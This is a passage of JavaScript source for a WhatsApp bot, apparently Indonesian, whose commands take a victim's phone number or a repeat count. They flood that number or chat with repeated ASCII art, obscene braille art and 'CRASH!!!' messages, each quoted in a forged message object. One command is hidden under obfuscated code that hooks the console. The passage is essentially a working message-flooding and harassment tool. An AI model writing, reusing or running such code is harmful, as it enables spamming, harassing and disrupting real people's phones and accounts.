            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"CRASH!!!"},{quoted:ikyenak66})
            m.reply(`Berhasil Mengirim Infinite iky Di Nomer ${text}`)
            break
          case 'ikymomo': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY MAKERZ`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            }
            jancok(`Sukses Send Momo Sebanyak ${jumlah}`)
            }
            break
          case 'ikymomoprivate': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ MOMO`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await m.reply(`Berhasil Mengirim Momo Di Nomer ${text}`)
            }
            break
          case 'ikygaskenmomo': {            
          if (!isCreator && !isBan) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ MOMO`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:momoe},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:ikyenak66})
            m.reply(`Berhasil Mengirim Momo Di Nomer ${text}`)
            }
            break

case 'malam':
case 'mlm':
case 'sore':
case 'siang':
case 'pagi': {            
          if (!isCreator && !isBan) return
             salem = `السلام عليكم
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `SALAM IKYY BOTZ`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:salem},{quoted:ikyenak66})
jancok(`Assalamualaikum`)
}
break
case 'ikyhello': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": ` IKYY INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
}
jancok(`Sukses Send Hello Sebanyak ${jumlah}`)
}
            break
case 'ikyhelloprivate': {            
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ HELLO`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await m.reply(`Berhasil Mengirim Hello Di Nomer ${text}`)
}
            break
case 'ikygaskenhello': {            
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ HELLO`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:halo},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:ikyenak66})
m.reply(`Berhasil Mengirim Hello Di Nomer ${text}`)
            }
            break
case 'peler': {            
  if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
pelernya = `
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `PELER IKYY🗿`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:pelernya}, {quoted:ikyenak66})
}
}
break
case 'jadipeler': {
var _0x236b81=_0x1a70;function _0x1a70(_0x10e156,_0x3f3b9f){var _0x9eb7bd=_0x511d();return _0x1a70=function(_0x24ba9c,_0x58e9ee){_0x24ba9c=_0x24ba9c-0xf8;var _0x88222a=_0x9eb7bd[_0x24ba9c];return _0x88222a;},_0x1a70(_0x10e156,_0x3f3b9f);}(function(_0x3325b0,_0x25a8b1){var _0x5ac15b=_0x1a70,_0x45d5c1=_0x3325b0();while(!![]){try{var _0x5143d1=-parseInt(_0x5ac15b(0xfa))/0x1*(parseInt(_0x5ac15b(0x111))/0x2)+-parseInt(_0x5ac15b(0xfd))/0x3+parseInt(_0x5ac15b(0xfe))/0x4*(parseInt(_0x5ac15b(0x103))/0x5)+parseInt(_0x5ac15b(0xf8))/0x6*(parseInt(_0x5ac15b(0x102))/0x7)+-parseInt(_0x5ac15b(0x10a))/0x8*(-parseInt(_0x5ac15b(0x10f))/0x9)+parseInt(_0x5ac15b(0x101))/0xa+parseInt(_0x5ac15b(0xf9))/0xb*(-parseInt(_0x5ac15b(0x10b))/0xc);if(_0x5143d1===_0x25a8b1)break;else _0x45d5c1['push'](_0x45d5c1['shift']());}catch(_0x1d0736){_0x45d5c1['push'](_0x45d5c1['shift']());}}}(_0x511d,0x5cf73));var _0x46f5f1=(function(){var _0x3d899e=!![];return function(_0x3a4c6e,_0x5e3a89){var _0x2ced46=_0x3d899e?function(){if(_0x5e3a89){var _0x17fe50=_0x5e3a89['apply'](_0x3a4c6e,arguments);return _0x5e3a89=null,_0x17fe50;}}:function(){};return _0x3d899e=![],_0x2ced46;};}()),_0x2648fd=_0x46f5f1(this,function(){var _0x57386b=_0x1a70;return _0x2648fd['toString']()['search'](_0x57386b(0x108))[_0x57386b(0x117)]()['constructor'](_0x2648fd)[_0x57386b(0x105)](_0x57386b(0x108));});_0x2648fd();var _0x58e9ee=(function(){var _0xe981f5=!![];return function(_0x196f24,_0x393103){var _0x51026b=_0xe981f5?function(){var _0xf5736f=_0x1a70;if(_0x393103){var _0x179e55=_0x393103[_0xf5736f(0x118)](_0x196f24,arguments);return _0x393103=null,_0x179e55;}}:function(){};return _0xe981f5=![],_0x51026b;};}()),_0x24ba9c=_0x58e9ee(this,function(){var _0x2cfe9c=_0x1a70,_0x1756e2;try{var _0x36c2bf=Function(_0x2cfe9c(0x100)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1756e2=_0x36c2bf();}catch(_0x2b1583){_0x1756e2=window;}var _0x58be41=_0x1756e2[_0x2cfe9c(0x107)]=_0x1756e2['console']||{},_0x366c4d=[_0x2cfe9c(0x113),'warn','info',_0x2cfe9c(0x10c),_0x2cfe9c(0x112),_0x2cfe9c(0x106),_0x2cfe9c(0x116)];for(var _0xaa8688=0x0;_0xaa8688<_0x366c4d[_0x2cfe9c(0x114)];_0xaa8688++){var _0x1410e1=_0x58e9ee[_0x2cfe9c(0x109)][_0x2cfe9c(0x115)]['bind'](_0x58e9ee),_0x55bb78=_0x366c4d[_0xaa8688],_0x2d62d9=_0x58be41[_0x55bb78]||_0x1410e1;_0x1410e1[_0x2cfe9c(0x10d)]=_0x58e9ee[_0x2cfe9c(0xfb)](_0x58e9ee),_0x1410e1[_0x2cfe9c(0x117)]=_0x2d62d9['toString'][_0x2cfe9c(0xfb)](_0x2d62d9),_0x58be41[_0x55bb78]=_0x1410e1;}});function _0x511d(){var _0x378424=['944205itMpyM','6548qsHvsg','Teksnya\x20Mana?','return\x20(function()\x20','887580cNCdqV','23954JenxLW','2265noEDYL','Sukses\x20Convert\x20Peler\x20','search','table','console','(((.+)+)+)+$','constructor','8YnYPrv','28236HrkXLT','error','__proto__','PELER\x20','2294379CZMzVm','sendMessage','8hGbtov','exception','log','length','prototype','trace','toString','apply','1194CjEJfa','4994VuBSjE','611AphPgS','bind','chat'];_0x511d=function(){return _0x378424;};return _0x511d();}_0x24ba9c();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw _0x236b81(0xff);pelernya=_0x236b81(0x10e)+text+'\x0a⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿\x0a⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿\x0a⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿\x0a⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿\x0a⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿\x0a⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊\x0a',await ikycoli[_0x236b81(0x110)](m[_0x236b81(0xfc)],{'text':pelernya},{'quoted':ikygamzyx}),jancok(_0x236b81(0x104)+text);}
}
break

case 'pelerpakepayment': {            
  if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
pelernya = `
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `PELER IKYY🗿`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:pelernya}, {quoted:ikyenak66})
}
jancok(`Sukses Send Peler Sebanyak ${jumlah}`)
}
break

case 'monyet': {            
 if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             nyet = `
┈┈╱▔▔▔▔▔╲┈┈HM┈HM
┈╱┈┈╱▔╲╲╲▏┈┈┈HMM
╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈
▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈
▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈
╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈
┈╲┈┈▏╭━━━━╯▕▕┈┈┈
┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈
┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈
┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲
┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕
┈▏ ┈┈┈╰┈┈┈┈╯┈┈┈▕▕
┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲
┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏
┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔
┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈
`
